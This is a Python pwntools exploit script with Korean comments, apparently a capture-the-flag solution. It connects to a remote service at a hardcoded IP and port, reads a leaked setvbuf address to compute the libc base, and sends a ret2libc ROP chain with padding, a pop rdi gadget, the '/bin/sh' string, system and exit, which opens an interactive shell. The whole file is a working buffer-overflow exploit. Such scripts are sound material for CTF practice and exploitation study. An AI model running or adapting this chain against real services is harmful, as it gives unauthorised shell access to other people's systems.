from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# libc 설정
libc = ELF('./libc.so.6')

# remote 연결 
p = remote('122.38.251.9', 31337)

# setvbuf 주소 받기
p.recvuntil(b'setvbuf : ')
setvbuf_addr = int(p.recvline().strip(), 16)
log.info(f"setvbuf address: {hex(setvbuf_addr)}")

# libc 기본 주소 계산
libc_base = setvbuf_addr - libc.symbols['setvbuf']
log.info(f"libc base: {hex(libc_base)}")

# 필요한 주소들 계산
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi_ret = libc_base + 0x23b6a 
ret = libc_base + 0x23b6b

# 종료를 위한 exit 함수 주소
exit_addr = libc_base + libc.symbols['exit']

log.info(f"system address: {hex(system_addr)}")
log.info(f"binsh address: {hex(binsh_addr)}")
log.info(f"pop rdi ret address: {hex(pop_rdi_ret)}")

# ROP 체인 구성
payload = b'A' * 40                   # 리턴 주소까지의 패딩
payload += p64(ret)                   # 스택 정렬
payload += p64(pop_rdi_ret)           # system 함수의 인자 설정을 위한 가젯
payload += p64(binsh_addr)            # "/bin/sh" 문자열 주소
payload += p64(system_addr)           # system() 호출
payload += p64(pop_rdi_ret)           # exit 함수 인자 설정
payload += p64(0)                     # 종료 상태 0
payload += p64(exit_addr)             # exit

print("Sending payload...")
p.clean()
p.send(payload)
print("Payload sent!")

p.interactive()

# exit_status = p.poll()
# log.info(f"Program exit status: {exit_status}")